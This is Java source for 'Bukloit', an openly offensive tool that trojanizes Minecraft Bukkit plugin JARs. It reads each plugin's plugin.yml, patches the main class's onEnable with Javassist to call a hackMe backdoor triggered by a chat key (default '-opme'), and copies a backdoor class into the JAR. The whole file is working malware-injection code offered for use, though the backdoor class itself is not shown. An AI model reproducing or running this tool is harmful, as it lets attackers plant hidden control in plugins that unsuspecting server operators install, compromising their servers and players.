package rikonardo.bukloit;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Collections;
import java.util.Map;
import org.apache.activemq.util.IOHelper;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.yaml.snakeyaml.Yaml;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

public class Injector {
	private static String key = "-opme";
	private static int SU = 0;
	private static int SK = 0;
	private static int ER = 0;
	private static boolean replace = false;
    public static void main(String[] args) {
    	
    	Options options = new Options();

        Option mode = new Option("m", "mode", true, "Can be single/multiple. Default: multiple");
        mode.setRequired(false);
        options.addOption(mode);

        Option input = new Option("i", "input", true, "Path to input folder/file. Default: in/in.jar");
        input.setRequired(false);
        options.addOption(input);
        
        Option output = new Option("o", "output", true, "Path to output folder/file. Default: out/out.jar");
        output.setRequired(false);
        options.addOption(output);
        
        Option keyOpt = new Option("k", "key", true, "The text to be used to activate the backdoor. Default: \"-opme\"");
        output.setRequired(false);
        options.addOption(keyOpt);
        
        Option doReplace = new Option("r", "replace", false, "Replace output file if it already exists");
        doReplace.setRequired(false);
        options.addOption(doReplace);

        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd = null;

        try {
            cmd = parser.parse(options, args);
        } catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp("Bukloit", options);

            System.exit(1);
        }

        String patchingMode = cmd.getOptionValue("mode");
        String inputFilePath = cmd.getOptionValue("input");
        String outputFilePath = cmd.getOptionValue("output");
        String textKey = cmd.getOptionValue("key");
        
        replace = cmd.hasOption("r");
        
        if(textKey != null) key = textKey;

    	Logger.info("Working in directory: " + System.getProperty("user.dir"));
        if(patchingMode != null && !patchingMode.equals("single") && !patchingMode.equals("multiple")) {
        	Logger.error("Incorrect \"mode\" flag value!");
        	System.exit(1);
        }
        else
        	if(patchingMode == null) FileHelper.dir2dir((inputFilePath != null) ? inputFilePath : "in", (outputFilePath != null) ? outputFilePath : "out");
        	else
        		if(patchingMode.equals("single")) FileHelper.file2file((inputFilePath != null) ? inputFilePath : "in.jar", (outputFilePath != null) ? outputFilePath : "out.jar");
        		else FileHelper.dir2dir((inputFilePath != null) ? inputFilePath : "in", (outputFilePath != null) ? outputFilePath : "out");
    	
    	Logger.info("All work done!");
    	if(SK > 0) Logger.warn("ATTENTION! If output file already exists, the plugin will be skipped. This setting can be changed by adding the \"--replace true\" flag!");
    	Logger.info("╔══════════════════════════════════════╗");
    	Logger.info("║ Plugin patched successfully: " + SU + String.join("", Collections.nCopies(8 - (String.valueOf(SU).length()), " ")) + "║");
    	Logger.info("║ Skiped plugins: " + SK + String.join("", Collections.nCopies(21 - (String.valueOf(SK).length()), " ")) + "║");
    	Logger.info("║ Plugins skiped due to an error: " + ER + String.join("", Collections.nCopies(5 - (String.valueOf(ER).length()), " ")) + "║");
    	Logger.info("╚══════════════════════════════════════╝");
    }
    
    private static class FileHelper {
    	private static void dir2dir(String from, String to) {
    		File inputDir = new File(from);
    		inputDir.mkdirs();
    	    File outputDir = new File(to);
    	    outputDir.mkdirs();
    		for (final File fileEntry : inputDir.listFiles()) {
                file2file(fileEntry.getPath(), to + "\\" + fileEntry.getName());
            }
    	}
    	
    	private static void file2file(String from, String to) {
    		Path in = Paths.get(from);
    		Path out = Paths.get(to);
    		
    		if(!in.toFile().exists()) {
    			Logger.info("File \"" + in.getFileName() + "\" does not exist, skip...");
            	SK++;
            	return;
    		}
    	    
    		try {
        	    File temp = new File("temp");
        	    temp.mkdirs();
        	    
        	    if(replace) Files.copy(in, out, StandardCopyOption.REPLACE_EXISTING);
        	    else Files.copy(in, out);
        	    
        		Map<String, Object> pluginMeta = readPluginMeta(in.toAbsolutePath().toString());
        		String NAME = (String) pluginMeta.get("name");
        		String MAIN = (String) pluginMeta.get("main");
        	    try {
	            	Logger.info("╔═>");
	            	Logger.info("║ Transforming \"" + in.getFileName() + "\" (" + NAME + ")");
	            	Logger.info("║ Patching main class: " + MAIN);
	            	
	            	ClassPool pool = new ClassPool(ClassPool.getDefault());
	            	pool.appendClassPath(from);
	        	    CtClass cc = pool.get(MAIN);
	        	    CtMethod m = cc.getDeclaredMethod("onEnable");
	        	    m.insertAfter("{ bukloit.Bukloit.hackMe(this, \"" + key.replace("\"", "\\\"") + "\"); }");
	        	    cc.writeFile(temp.toString());
	        	    
	        	    Path patched = Paths.get("temp/" + MAIN.replace(".", "/") + ".class");
	        	    
	        	    FileSystem outStream = FileSystems.newFileSystem(out, null);
	        	    Path targetCLASS = outStream.getPath("/" + MAIN.replace(".", "/") + ".class");
	            	Logger.info("║ Injecting patched class...");
	                Files.copy(patched, targetCLASS, StandardCopyOption.REPLACE_EXISTING);
	                
	        	    InputStream hackAPI = IOHelper.class.getResourceAsStream("/bukloit/Bukloit.class");
	                Path targetAPICLASS = outStream.getPath("/bukloit/Bukloit.class");
	                Files.createDirectory(outStream.getPath("/bukloit"));
	            	Logger.info("║ Injecting backdoor class...");
	                Files.copy(hackAPI, targetAPICLASS);
	                outStream.close();
	            	Logger.info("║ Bukloit successfully injected into the \"" + NAME + "\" plugin!");
	            	Logger.info("╚═>");
	                SU++;
                }
        	    catch (Exception e) {
        	    	Logger.warn("║ An error occurred while patching the \"" + NAME + "\" plugin!");
	            	Logger.info("╚═>");
        	    	ER++;
        	    }
        	    
                deleteDir(temp);
    		}
    		catch (Exception e) {
            	Logger.info("File \"" + in.getFileName() + "\" was skiped!");
            	SK++;
    		}
    		
    	}
    	
    	private static Map<String, Object> readPluginMeta(String pathIn) throws IOException {
    		Yaml yaml = new Yaml();
    		InputStream in = null;
		
		/*Allows the injector to work on platforms other than Windows, Cheers.
		 * -MJWaffle */
		String inputFile = "jar:file:/" + pathIn +"!/plugin.yml";
		String os = System.getProperty("os.name");
		if(!os.contains("Win"))
			inputFile = "jar:file://" + pathIn +"!/plugin.yml";  
			       
    		if (inputFile.startsWith("jar:")){
    			URL inputURL = new URL(inputFile);
    			JarURLConnection conn = (JarURLConnection)inputURL.openConnection();
    			in = conn.getInputStream();
    		}
    		return yaml.load(in);
    	}
    	
    	private static void deleteDir(File file) {
    	    File[] contents = file.listFiles();
    	    if (contents != null) {
    	        for (File f : contents) {
    	            if (! Files.isSymbolicLink(f.toPath())) {
    	                deleteDir(f);
    	            }
    	        }
    	    }
    	    file.delete();
    	}
    }
}
